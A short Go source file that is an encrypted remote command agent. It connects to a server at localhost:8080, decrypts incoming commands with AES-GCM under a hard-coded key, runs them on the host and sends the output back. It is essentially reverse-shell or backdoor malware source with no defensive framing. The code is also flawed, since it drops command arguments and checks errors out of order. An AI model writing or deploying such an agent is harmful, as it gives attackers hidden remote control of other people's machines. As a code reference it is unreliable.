package main

import (
	// Standard
	"crypto/aes"
	"crypto/cipher"
	"encoding/gob"
	"fmt"
	"net"
	"os/exec"
	"runtime"
	"strings"
)


func decrypt(ciphertext []byte) string {
	key := []byte("passphrasewhichneedstobe32bytes!")

	c, err := aes.NewCipher(key)

	if err != nil {
		fmt.Println(err)
	}

	gcm, err := cipher.NewGCM(c)
	if err != nil {
		fmt.Println(err)
	}

	nonceSize := gcm.NonceSize()

	if len(ciphertext) < nonceSize {
		fmt.Println(err)
	}

	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	decCmd, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		fmt.Println(err)
	}

	return string(decCmd)
}


func main() {
	conn, err := net.Dial("tcp", "localhost:8080")

	encCmd := []byte("")
	dec := gob.NewDecoder(conn)
	enc := gob.NewEncoder(conn)

	if err != nil {
		enc.Encode(err)
	}

	cmdLoop:for {
		dec.Decode(&encCmd)
		cmd := decrypt(encCmd)
		cmd = strings.TrimSuffix(cmd, "\n")
	
		switch {
		case cmd == "close":
			continue
		case cmd == "exit":
			break cmdLoop
		case cmd == "sysinfo":
			osType := runtime.GOOS
			enc.Encode(osType)
		default:
			splitCmd := strings.Split(cmd, " ")
			out, err := exec.Command(splitCmd[0]).Output()
		
			if err != nil {
				enc.Encode(err)
			}

			output := string(out[:])
			enc.Encode(output)
		}	
	}
	conn.Close()
}